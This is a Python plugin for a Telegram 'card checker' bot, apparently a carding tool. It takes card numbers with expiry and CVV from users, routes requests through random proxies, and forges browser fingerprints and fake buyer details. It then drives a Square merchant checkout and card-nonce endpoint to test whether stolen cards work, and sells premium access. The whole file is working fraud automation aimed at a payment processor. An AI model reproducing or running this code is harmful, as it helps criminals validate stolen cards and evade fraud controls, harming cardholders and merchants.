import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import datetime
import names
import re
import string
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError
from bs4 import BeautifulSoup
from urllib.parse import urlparse#pip install urllib3
import time
import random
import string


max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def find_between(data: str, first: str, last: str) -> str:
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''

def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Square Up"
subtype = "$1"
command = "sq"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def stripeau(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    if not ccs:
        reply = message.reply_to_message
        texto = reply.text[:6]
    else:
        texto = ccs[:6]
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()
    
    
    #------------------- #1 Requests -------------------#
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'pay_link_user_site=KA1N4E7NPR4D7%3A; __cf_bm=XbItBVMrQwGPTpDlR_b9C4T2UqmTEUdOXmPnbbBiPsw-1715572956-1.0.1.1-K2yQyvI_IXS.Py4VQt51oFVTehpTTQ8VNZKd_7rHg3EXTjITGQ.9vZa4bfO1YWOlvh2_wLL098.Cias51JyaiA; _sp_ses.7acb=*; _sp_id.7acb=4d4b7963-7474-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVdd359d56-89b3-4185-b71d-377b68fc3d2d&created=1715572964153&expire=1715574088808',
        'origin': 'https://checkout.square.site',
        'priority': 'u=1, i',
        'referer': 'https://checkout.square.site/merchant/KA1N4E7NPR4D7/checkout/BXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    json_data = {
        'buyerControlledPrice': {
            'amount': 100,
            'currency': 'USD',
            'precision': 2,
        },
        'subscriptionPlanId': None,
        'oneTimePayment': True,
        'itemCustomizations': [],
    }

    response = session.post(
        'https://checkout.square.site/api/merchant/KA1N4E7NPR4D7/checkout/BXFZIPLP2NMENC6AKDMWJNOK',
        headers=headers,
        json=json_data,
    ).text
                
    order = parseX(response, '"order":{"id":"','"')
    print(order)
    location = parseX(response, '"location_id":"','"')
    print(location)
    cheaders = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        # 'cookie': 'pay_link_user_site=KA1N4E7NPR4D7%3A; __cf_bm=XbItBVMrQwGPTpDlR_b9C4T2UqmTEUdOXmPnbbBiPsw-1715572956-1.0.1.1-K2yQyvI_IXS.Py4VQt51oFVTehpTTQ8VNZKd_7rHg3EXTjITGQ.9vZa4bfO1YWOlvh2_wLL098.Cias51JyaiA; _sp_ses.7acb=*; _sp_id.7acb=4d4b7963-7474-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVdd359d56-89b3-4185-b71d-377b68fc3d2d&created=1715572964153&expire=1715574088808',
        'origin': 'https://checkout.square.site',
        'priority': 'u=1, i',
        'referer': 'https://checkout.square.site/merchant/KA1N4E7NPR4D7/checkout/BXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    response = session.patch(
        f'https://checkout.square.site/api/merchant/KA1N4E7NPR4D7/location/{location}/order/{order}/visited',
        headers=headers,
    )

    headers = {
        'accept': '*/*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_savt=84ab9467-abf5-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx21_y5AJPopyphG5MMT9KcL0DSJ3yI2kElZnQwPtoe.ffYjGXf5mkpVUnDBcCRVMJ7sSJxTBRh8aBx40gJJRIg',
        'origin': 'https://connect.squareup.com',
        'priority': 'u=1, i',
        'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2FKA1N4E7NPR4D7%2Fcheckout%2FBXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    json_data = {
        'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0","language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
        'fingerprint': '8119a85c0b1d71d1cedeb009d89b3e3e',
        'timezone': '300',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
        'version': '64a2cdcfed83c8465ab0f75c37a07bb075ed9d5a',
        'website_url': 'https://checkout.square.site/',
        'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
        'browser_fingerprint_by_version': [
            {
                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0","language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"8119a85c0b1d71d1cedeb009d89b3e3e"}',
                'payload_type': 'fingerprint-v1',
            },
            {
                'payload_json': '{"components":{"language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"3e9f4502176cd3958a3bb800711b2363"}',
                'payload_type': 'fingerprint-v1-sans-ua',
            },
        ],
    }

    response = session.post('https://connect.squareup.com/v2/analytics/token', headers=headers, json=json_data).json()

    token = response['token']

    print(token)


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'pay_link_user_site=KA1N4E7NPR4D7%3A; _sp_ses.7acb=*; square-sync-csrf=eyJpdiI6ImMzUWFJNG55TFB1YTRSeTQyenVsYVE9PSIsInZhbHVlIjoiOENJVlM1dC8wd0lNNjlOQVpzeU5rYmFRUms2cmU1a0pBN2t2TGVEZjMraHlVdVAyNjVtNE9nQkZjUEtwZVlreWxCVjhWOXh1eDNFdTlJNjMwUlR6OHpkYVFNUXMxYVkrekh5L0ZLSUhzZUNTTFdKaWtBbTMwclpYcVZkeFJlc2siLCJtYWMiOiI4YzBmZTE2MGQ3MDVkOTA3NmIxZjM3MTQwZmJiMmE5YjJjNDJlNjUwNDQzNzlmYTIwNTQ5MTE2NWYyZDBkMmNhIiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IjRJTnpPZnBkNytPaUtocmlhbFZ6Q2c9PSIsInZhbHVlIjoiOTR1WUpRMGJuRUJJK0UyU241ZThlS1BjSXFwUFNCL2hHL3d3MmlYcHhYYThzWlQzZTQ5Nm9ndXVZRFdSdWhHU20yNXNGZjI1Z0Y2Y09ORjVrNzRWZ04yS1Q0WURsVFJNZS9OQ2c0eWVVOGdNdThSTlBFR2d3NnV5ZGYxWVNEdEYiLCJtYWMiOiI2ZTRiNDZmNTM5NGU1ZWMxNDcyMjFkN2FiODJmZmM2YWI5OTRiNzlhZmRkY2RlYWU1Y2VmYTU1MTEyZjk3ZjU1IiwidGFnIjoiIn0%3D; merchant:KA1N4E7NPR4D7:order:LeB2TgYTAYv3TkA7WKK1ji6kcVZYMd4kqk:locale=es; customer_xsrf=eyJpdiI6IngwSGU2UjlGUC9zNWxSSHBwNWkrQlE9PSIsInZhbHVlIjoibWtxVnBnbHRXeTVXYzZUMVMycklQVzJseC9HM0RrNFNGWjJUMGRBeFFZckQwYnZJQXJ1MlVOa1FwZFk0OWJEZzBIMHJTTnlHZ05scWNpSWdRTXo0WTBCREtRQ1RtdDB2WjJ3bVV5N05MTVFmdHZycjJmZjhGNS9TQkdPNFFwNE4iLCJtYWMiOiIxMzcxNGYxZDFkZDQ0YjQ5MDZjZDkyZjg3MGM2YjAwMzQzMDIwZDgzNTg0YTQyMzFmNzI4NzYxMjJmYTE0MTc0IiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6Ik5WQUJNK29hcFBpeDV1bHRxdnlOR1E9PSIsInZhbHVlIjoiVmc3RldzUlh0ZFZMNjdJZjUyUmdCUGN5R3VHcFBuVGdPU1hCRkF0SWhWbW0zQVVUMGJpZDFFNVNyS2h2eUJMSk1icnBiZ0gzdy85bm5lbWlzLzhrZkhuQlVTaktvRlZwRTVPMFZWWHpiVzJRSkpjSFBGdmtwcTBYNW9YRXVucE4iLCJtYWMiOiJlMDljZmZkMmJlNjdlZTIyNzNiZDczNjRlOTliODk3MGMwZDM0ZTc2NGQwYmVkZWM3ZmU1MWU4OWNlMTk0MThkIiwidGFnIjoiIn0%3D; _sp_id.7acb=4d4b7963-7474-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVdd359d56-89b3-4185-b71d-377b68fc3d2d&created=1715572964153&expire=1715575698469',
        'origin': 'https://checkout.square.site',
        'priority': 'u=1, i',
        'referer': 'https://checkout.square.site/merchant/KA1N4E7NPR4D7/checkout/BXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
        'x-datadog-origin': 'rum',
        'x-datadog-parent-id': '7555685874476463325',
        'x-datadog-sampling-priority': '1',
        'x-datadog-trace-id': '8785882258438076535',
    }

    json_data = {
        'given_name': 'Peñafiel',
        'family_name': 'Polo',
        'email_address': 'uhmbwkmlkfvxh@internetkeno.com',
        'phone_number': {
            'national_number': '2553674883',
            'region_code': 'US',
            'country_code': '1',
            'formatted': '',
        },
        'shipping_address': {
            'first_name': 'Peñafiel',
            'last_name': 'Polo',
            'phone': {
                'national_number': '2553674883',
                'region_code': 'US',
                'country_code': '1',
                'formatted': '',
            },
            'label': 'Shipping',
        },
    }

    response = session.patch(
        f'https://checkout.square.site/api/soc-platform/merchant/KA1N4E7NPR4D7/location/{location}/order/{order}/customer',
        headers=headers,
        json=json_data,
    )


    headers = {
        'accept': 'application/json',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '__cf_bm=0Z469tPllLi6akN8_F5M1n4qQ8k6NTLU4YBx77eiSqE-1715573200-1.0.1.1-lc53GTq_kl3aVQlnKEgbRKqu_iCVUbxggSiB0gGOqenK2vYD2xk0erqsf75fRx4uBsAyNpQhQPuLEoezVMlluw',
        'origin': 'https://web.squarecdn.com',
        'priority': 'u=1, i',
        'referer': 'https://web.squarecdn.com/',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    params = {
        'applicationId': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
        'hostname': 'checkout.square.site',
        'locationId': location,
        'version': '1.56.0',
    }

    response = session.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers).text

    session2 = parseX(response, '"sessionId":"','"')

    print(session2)


    headers = {
        'accept': 'application/json',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_savt=84ab9467-abf5-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV6xswRp6W41PAGHn9SKYZVfjVTTy4P2zfASMzPaUqjadcSWJ4VavKbyXdWHtmsacvDzRIPA7lUYiOu_yXBcpWOA',
        'origin': 'https://web.squarecdn.com',
        'priority': 'u=1, i',
        'referer': 'https://web.squarecdn.com/',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    params = {
        '_': '1715575185102.2827',
        'version': '1.56.0',
    }

    json_data = {
        'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
        'location_id': location,
        'payment_method_tracking_id': '1b261c91-fdb9-00d6-5fc4-9918997e024e',
        'session_id': session2,
        'website_url': 'checkout.square.site',
        'analytics_token': token,
        'card_data': {
            'cvv': cvv,
            'exp_month': int(mes),
            'exp_year': int(ano),
            'number': ccnum,
        },
    }

    response = session.post(
        'https://pci-connect.squareup.com/v2/card-nonce',
        params=params,
        headers=headers,
        json=json_data,
    ).json()
                
    cnon = response['card_nonce']
    print(cnon)

    headers = {
        'accept': '*/*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_savt=84ab9467-abf5-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVmxtwWkYWIDSs_WTx0DTGb.dT20t_ixEvwnuTn962CyBaHyFPGKii7NFU8pc5LA3KrfsZ6Z6ZQWIhoBOyOMfsfw',
        'origin': 'https://connect.squareup.com',
        'priority': 'u=1, i',
        'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2FKA1N4E7NPR4D7%2Fcheckout%2FBXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }

    json_data = {
        'browser_fingerprint_by_version': [
            {
                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0","language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"8119a85c0b1d71d1cedeb009d89b3e3e"}',
                'payload_type': 'fingerprint-v1',
            },
            {
